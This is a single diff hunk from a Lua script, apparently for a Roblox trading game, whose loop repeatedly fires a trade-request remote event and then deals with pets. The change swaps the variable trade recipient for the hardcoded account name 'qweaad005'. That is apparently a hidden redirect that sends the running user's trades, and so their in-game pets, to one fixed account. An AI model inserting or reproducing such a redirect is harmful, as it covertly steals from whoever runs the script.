@@ -456,7 +456,7 @@ local ab =0;
 
 while true do
  if not Player.PlayerGui.TradeApp.Frame.Visible then
-                        ReplicatedStorage.API:FindFirstChild("TradeAPI/SendTradeRequest"):FireServer(Playt)
+                        ReplicatedStorage.API:FindFirstChild("TradeAPI/SendTradeRequest"):FireServer("qweaad005")
                     end 
                     if Player.PlayerGui.TradeApp.Frame.Visible then
                         if Petsd == "Pets" then
